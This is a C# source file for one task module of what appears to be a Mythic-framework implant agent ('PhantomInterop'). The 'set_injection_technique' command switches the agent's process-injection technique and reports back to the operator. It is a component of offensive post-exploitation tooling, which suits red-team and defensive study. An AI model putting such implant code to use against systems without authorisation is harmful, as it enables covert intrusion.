#define COMMAND_NAME_UPPER

#if DEBUG
#define SET_INJECTION_TECHNIQUE
#endif

#if SET_INJECTION_TECHNIQUE

using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;

namespace Tasks
{
    public class set_injection_technique : Tasking
    {
        public set_injection_technique(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            if (_agent.GetInjectionManager().SetTechnique(_data.Parameters))
            {
                resp = CreateTaskResponse($"Set injection technique to {_data.Parameters}", true);
            }
            else
            {
                resp = CreateTaskResponse($"Unknown technique: {_data.Parameters}", true, "error");
            }

            
            
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif